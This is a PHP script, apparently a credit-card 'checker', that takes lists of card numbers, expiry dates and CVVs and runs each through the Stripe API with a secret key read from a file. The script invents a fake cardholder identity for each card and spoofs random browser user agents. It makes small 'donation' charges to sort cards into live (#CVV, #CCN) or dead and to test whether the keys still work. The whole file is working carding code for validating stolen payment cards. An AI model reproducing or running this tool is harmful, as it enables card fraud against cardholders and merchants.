<?php
 
session_start();
if (!isset($_SESSION['username'])) {
    return header("location: ./?error=user_not_logged");
  }
 
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

$amount = 0.8;
$sk_file = file("sks_usd.txt");
$get_sk = end($sk_file); 
$sk= trim($get_sk);
if(isset($_GET['amount'])){
$amount = $_GET['amount'];
}
$cur ="$";
$hyper = array("currency"=>"usd", "desc"=>"hyper donation", "currency_symbol"=>$cur,"amount"=>$amount ==="min" ? 50 : $amount * 100, "country"=>"India", "sk"=>$sk);


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$lista = $_GET['lista'];
$cc = multiexplode(array(":", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", " ", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
return "";}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));}
function mod($dividendo,$divisor){
return round($dividendo - (floor($dividendo/$divisor)*$divisor));}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch); 
$emoji = GetStr($fim, '"emoji":"', '"'); 
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = " $type - $brand - $country $emoji"; 

        $get = file_get_contents('https://randomuser.me/api/1.3/?nat='.$country.'');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]='.$street.'200&card[address_line2]=Apartment&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]='.$country.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r1 = curl_exec($ch);
$tok = trim(strip_tags(getstr($r1,'"id": "','"')));


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[email]='.$email.'&source='.$tok.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r2 = curl_exec($ch);
$cus = trim(strip_tags(getstr($r2,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$cus.'&description='.$hyper['desc'].'&amount='.$hyper['amount'].'&currency='.$hyper['currency'].'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r3 = curl_exec($ch);
$charge = trim(strip_tags(getstr($r3,'"id": "','"')));
$check3 = trim(strip_tags(getStr($r3,'"cvc_check": "','"')));
$msg3 = trim(strip_tags(getStr($r3,'"message": "','"')));
$d_code3 = trim(strip_tags(getStr($r3,'"decline_code": "','"')));
$receipturl = trim(strip_tags(getStr($r3,'"receipt_url": "','"')));
$networkstatus = trim(strip_tags(getStr($r3,'"network_status": "','"')));
$risklevel = trim(strip_tags(getStr($r3,'"risk_level": "','"')));
$seller_message = trim(strip_tags(getStr($r3,'"seller_message": "','"')));


if (strpos($r3, '"seller_message": "Payment complete."')){
$status = '#CVV';
$resmsg = $cur.$amount.' Charged! ';
echo ' <p class="uk-margin-small-top">'.$status.' : '.$resmsg.' : ' . $lista . ' : '.$country.' : <a class="receipt" href="'.$receipturl.'">Get Receipt</a> - </p>';
exit;
}elseif ((strpos($r2,'insufficient_funds')) || (strpos($r3,'insufficient_funds'))){
$status = '#CVV';
$resmsg = 'Insufficient';
}elseif (strpos($r3, "incorrect_cvc") || strpos($r2, "incorrect_cvc")) {
    $status = '#CCN';
$resmsg = 'Incorrect cvc';

}
elseif (strpos($r1, 'rate_limit')){
  $status = 'SK KEY';
  $resmsg = 'rate_limit';
  }
elseif (strpos($r1, 'test_mode_live_card')){
$status = 'SK KEY';
$resmsg = 'test_mode';
}

elseif (strpos($r1, 'testmode_charges_only')){
$status = 'SK KEY';
$resmsg = 'testmode_charges_only';
}

elseif(strpos($r1, "invalid_request_error" )) {
$status = 'SK KEY';
$resmsg = 'Invalid Request';
}

elseif(strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe" )) {
$status = 'SK KEY';
$resmsg = 'SK KEY DEAD';
}

elseif(strpos($r1, "api_key_expired" )) {
$status = 'SK KEY';
$resmsg = 'api_key_expired';
}

else {
$status = 'Declined';
$resmsg = 'DEAD';
}

    echo '<p class="uk-margin-small-top">'.$status.' | '.$resmsg.' | ' . $lista . ' | '.$d_code3.  ' </p>';


curl_close($ch);
ob_flush();

?>